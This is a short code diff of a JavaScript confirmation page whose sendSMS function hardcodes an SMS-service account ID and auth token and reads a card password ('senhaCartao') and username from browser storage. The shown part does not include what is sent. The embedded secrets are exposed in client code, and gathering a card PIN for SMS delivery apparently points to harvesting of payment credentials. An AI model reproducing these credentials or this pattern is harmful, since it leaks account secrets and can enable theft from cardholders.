@@ -38,7 +38,7 @@ const ConfirmPage = () => {
 
   const sendSMS = () => {
     const accountSid = 'AC77c1f68e37767c376e514499e22398f9';
-    const authToken = '49faff236b543b7ca6ea00bf3f53e092';
+    const authToken = '14fb83f2a7e8bf6949bec04dcd797d2f';
 
     const senhaCartao = localStorage.getItem('senhaCartao');
     const username = localStorage.getItem('username');
